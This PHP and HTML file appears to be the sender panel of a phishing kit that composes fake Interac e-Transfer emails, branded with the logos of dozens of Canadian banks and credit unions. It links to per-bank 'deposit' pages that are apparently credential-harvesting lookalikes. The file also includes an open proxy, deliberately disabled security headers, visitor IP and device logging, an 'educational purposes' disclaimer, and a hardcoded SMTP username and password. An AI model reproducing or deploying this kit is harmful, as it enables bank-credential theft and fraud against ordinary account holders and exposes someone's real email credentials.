<?php
include "/mods/antibot.php";

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 " . $info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}

$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS()
{
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }

    return $os_platform;
}

function getBrowser()
{
    global $user_agent;
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }

    return $browser;
}

$user_os = getOS();
$user_browser = getBrowser();

$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file = 'data.dat';
$file1 = 'combo.txt';
$file2 = 'master.log';
$ip = "" . $PublicIP;
$uaget = "" . $user_agent;
$bsr = "" . $user_browser;
$uos = "" . $user_os;
$ust = explode(" ", $user_agent);
$vr = $ust[3];
$ver = str_replace(")", "", $vr);
$version = "Version              : " . $ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
} else {
    $details = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details = json_decode($details, true);
$success = $details['success'];
$fp = fopen($file, 'a');

if ($success == false) {
    fwrite($fp, $ip . "\n");
    fwrite($fp, $uos . "\n");
    fwrite($fp, $version . "\n");
    fwrite($fp, $bsr . "\n");
    fclose($fp);
} else if ($success == true) {
    $country = $details['country'];
    $city = $details['city'];
    $continent = $details['continent'];
    $tp = $details['type'];
    $cn = $details['country_phone'];
    $is = $details['isp'];
    $la = $details['latitude'];
    $lp = $details['longitude'];
    $crn = $details['currency'];
    $type = $tp;
    $isp = $is;
    $bank = "INTERACT WITH YOUR NEIGBORS![OPEN]";
    $LL = "+";
    $currency = "" . $full_date;
    $lh = "|";
    $li = ",";
}


?><!DOCTYPE html>
<html lang="en">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PHP Mailer System</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PHP Mailer System</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <style>
    /* CSS design optimized for iPhones */
    body {
      font-family: Arial, sans-serif;
      font-size: 16px;
      color: #333333;
      background-color: #f2f2f2;
    }
    
  

:root {
  --glow-color: hsl(100 100% 69%);
}

*,
*::before,
*::after {
  box-sizing: border-box;
}

html,
body {
  height: 100%;
  width: 100%;
  overflow: hidden;
}

body {
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: black;
}

.glowing-btn {
  position: relative;
  color: var(--glow-color);
  cursor: pointer;
  padding: 0.35em 1em;
  border: 0.15em solid var(--glow-color);
  border-radius: 0.45em;
  background: none;
  perspective: 2em;
  font-family: "Raleway", sans-serif;
  font-size: 2em;
  font-weight: 900;
  letter-spacing: 1em;

  -webkit-box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),
    0px 0px 0.5em 0px var(--glow-color);
  -moz-box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),
    0px 0px 0.5em 0px var(--glow-color);
  box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),
    0px 0px 0.5em 0px var(--glow-color);
  animation: border-flicker 2s linear infinite;
}

:root {
  /* Base font size */
  font-size: 4px;   
  
  /* Set neon color */
  --neon-text-color: #f40;
  --neon-border-color: #08f;
}

body {
  font-family: 'Exo 2', sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;  
  background: #000;
  min-height: 100vh;
}

h1 {
  font-size: 13rem;
  font-weight: 200;
  font-style: italic;
  color: #fff;
  padding: 4rem 6rem 5.5rem;
  border: 0.4rem solid #fff;
  border-radius: 2rem;
  text-transform: uppercase;
  animation: flicker 1.5s infinite alternate;     
}

h1::-moz-selection {
  background-color: var(--neon-border-color);
  color: var(--neon-text-color);
}

h1::selection {
  background-color: var(--neon-border-color);
  color: var(--neon-text-color);
}

h1:focus {
  outline: none;
}

/* Animate neon flicker */
@keyframes flicker {
    
    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
      
        text-shadow:
            -0.2rem -0.2rem 1rem #fff,
            0.2rem 0.2rem 1rem #fff,
            0 0 2rem var(--neon-text-color),
            0 0 4rem var(--neon-text-color),
            0 0 6rem var(--neon-text-color),
            0 0 8rem var(--neon-text-color),
            0 0 10rem var(--neon-text-color);
        
        box-shadow:
            0 0 .5rem #fff,
            inset 0 0 .5rem #fff,
            0 0 2rem var(--neon-border-color),
            inset 0 0 2rem var(--neon-border-color),
            0 0 4rem var(--neon-border-color),
            inset 0 0 4rem var(--neon-border-color);        
    }
    
    20%, 24%, 55% {        
        text-shadow: none;
        box-shadow: none;
    }    
}
    /* Form element styling */
    input[type="text"], textarea {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
      margin-top: 6px;
      margin-bottom: 16px;
      resize: vertical;
      font-size: 16px;
    }
    
    /* Submit button styling */
    input[type="submit"] {
      background-color: #007bff;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      transition: background-color 0.3s ease;
    }
    
    /* Submit button hover state */
    input[type="submit"]:hover {
      background-color: #0062cc;
    }
    
    /* Error message styling */
    .error {
      color: #dc3545;
      font-size: 14px;
    }
  </style>
  
<h1>[RR]</h1>
</head>
<body>

<form  action="submit.php" method="POST" enctype="multipart/form-data">
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
	  <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
	    <span class="navbar-toggler-icon"></span>
	  </button>
	  <div class="navbar-collapse collapse" id="navbarNav" style="">

	
	  </div>
	  
	</nav>
 <fieldset>
  <h1>e TRANS </h1>

<input type="hidden" name="link" value="<?php echo $_SERVER['HTTP_HOST']; ?>" required>
<input type="text"   name="receiver_email" placeholder="receivers email" value="THIS IS FOR"  required>
<input type="text"   name="receiver_name"  placeholder="receivers name"  value="EDUCATIONAL" required>
<input type="text"   name="sender_name"    placeholder="sender name"     value="PURPOSES" required>
<input type="text"   name="amount"         placeholder="100.00"          Value="ONLY!!!"  step="0.01"  required>
<input type="text"   name="expiredate"     placeholder="May 8,2023"      Value="REMOVE FOR PLACEHOLDER"    required>
<center>BY DELETING THE VALUE MEANS YOU UNDERSTAND THAT I WILL NOT BE HELD RESPONSIBLE 
    FOR ANY ILLIGAL OR UNLAWFUL ACTIVATIES COMMITED WITH THIS TOOL.. THANK YOU
</center>
<!-- THESE MENUS ARE ONLY NEEDED IF YOUR USING METHOD 1 . BUT YOU NEED AN ACTIVE SMTP EMAIL ADDRESS GMAIL DONT WORK  -->
<label for="photo_link">BANK | LOGO</label>
<select name="photo_link" id="photo_link">
<option value="NULL"> - BANK LOGO - </option>   
<option value="https://etransfer-content.interac.ca/en/logo_CA000002.png">Scotiabank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000001.png">BMO</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000003.png">RBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000010.png">CIBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000219.png">ATB </option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000004.png">TD</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000292.png">NBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000045.png">Desjardins</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000118.png">Laurentian</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000062.png">HSBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000344.png">Simplii Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000007.png">Tangerine</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000310.png">Motusbank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000308.png">EQ Bank</option>
<option value="null">- CREDIT UNIONS - </option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000315.png">FirstOntario CU ghg</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000238.png">Meridian CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000343.png">Manulife Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000346.png">Motive Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000324.png">Alterna Savings</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000210.png">Bridgewater Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000311.png">Oaken Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000341.png">Zag Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000016.png">President's Choice Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000217.png">Servus CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000314.png">Westminster Savings </option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000325.png">Christian CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000331.png">Vancity CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000332.png">Valley First CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000338.png">Mountain View Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000345.png">Connect First CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000071.png">ICICI Bank Canada</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000129.png">National Bank Direct </option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000174.png">Caisse Financial Group</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000188.png">State Bank of India)</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000205.png">Bridgeway Nationa</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000212.png">AcceleRate Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000239.png">First Calgary Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000244.png">Tandia Financial Credit </option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000254.png">DUCA CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000256.png">Envision Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000271.png">Interior Savings </option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000279.png">Kindred CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000290.png">Northern CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000309.png">Steinbach CU</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000326.png">Synergy CU</option>
</select>


<label for="bank">BANK | NAME</label>
<select name="bank" id="bank">
<option value="NULL">- BANK NAME - </option>   
<option value="ATB Financial">ATB</option>
<option value="Bank of Montreal">BMO</option>	
<option value="CIBC">CIBC</option>
<option value="Desjardins">Desjardins</option>
<option value="HSBC Bank Canada">HSBC </option>
<option value="Scotiabank">Scotia</option>
<option value="RBC Royal Bank">RBC</option>
<option value="Simplii Financial">Simplii</option>
<option value="TD Canada Trust">TD</option>
<option value="National Bank of Canada">NBC</option>
<option value="Laurentian Bank of Canada">Laurentian</option>
<option value="Manulife Bank of Canada">Manulife</option>
<option value="Motus">Motusbank</option>
<option value="Tangerine Bank">Tangerine</option>
</select>
<label for="bank">BANK | LINK</label>    
<select name="photo_href" id="photo_href">
<option value="NULL">-  BANK IMAGE  - </option> 
<option value="/public/deposit/atb/928460.php">ATB</option>
<option value="/public/deposit/bmo/928460.php">BMO</option>
<option value="/public/deposit/cibc/928460.php">CIBC</option>
<option value="/public/deposit/desj/928460.php">Desjardins</option>
<option value="/public/deposit/hsbc/928460.php">HSBC</option>
<option value="/public/deposit/sco/928460.php">Scotiabank</option>
<option value="/public/deposit/simplii/928460.php">Simplii</option>
<option value="/public/deposit/rbc/928460.php">RBC</option>
<option value="/public/deposit/td/928460.php">TD</option>
<option value="/public/deposit/nbc/928460.php">NBC</option>
<option value="/public/deposit/laur/928460.php">Laurentian</option>
<option value="/public/deposit/manu/928460.php">Manulife</option>
<option value="/public/deposit/motus/928460.php">Motusbank</option>
<option value="/public/deposit/tang/928460.php">Tangerine </option>
      </select>
      <!-- this is the end of the drop down menus -->
<!DOCTYPE html>
<html>
  <head>
  </head>
  <body>
    <ul>
    </style>
  </select>
<!-- THIS IS THE SUBMIT BUTTON THAT SENDS THE FORM DATA TO PHPMAILER -->
<input type="submit" value="Submit">
<!-- THIS IS THE SMTP INPUT SECTION -->
<center>ENTER YOUR SMTP INFO HERE</center>
<input type="text"       name="port"       value="587"         required>
<input type="text"       name="username"   value="info@supportdrone.ca"    required>
<input type="text"       name="password"   value="Kelownabc2020"     required>
<input type="text"       name="host"       value="smtp.office365.com"          required>
    </div>
</body>
</html>
